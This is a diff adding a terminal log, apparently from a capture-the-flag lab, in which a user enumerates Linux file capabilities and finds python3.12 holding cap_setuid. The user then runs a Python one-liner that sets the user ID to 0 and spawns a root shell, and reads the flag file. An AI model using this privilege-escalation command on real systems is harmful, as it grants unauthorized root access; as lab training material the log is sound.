@@ -1,0 +1,15 @@
+john@capabilities-box:~$ getcap -r / 2>/dev/null
+/snap/core20/2379/usr/bin/ping cap_net_raw=ep
+/snap/core22/1621/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+/usr/bin/python3.12 cap_setuid=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+john@capabilities-box:~$ ls -l /usr/bin/python3.12 
+-rwxr-xr-x 1 root root 8019136 Sep 11  2024 /usr/bin/python3.12
+john@capabilities-box:~$ /usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")' 
+root@capabilities-box:~# whoami
+root
+root@capabilities-box:~# cat /root/flag.txt 
+THM{caps_getting_r00T}root@capabilities-box:~# 
+
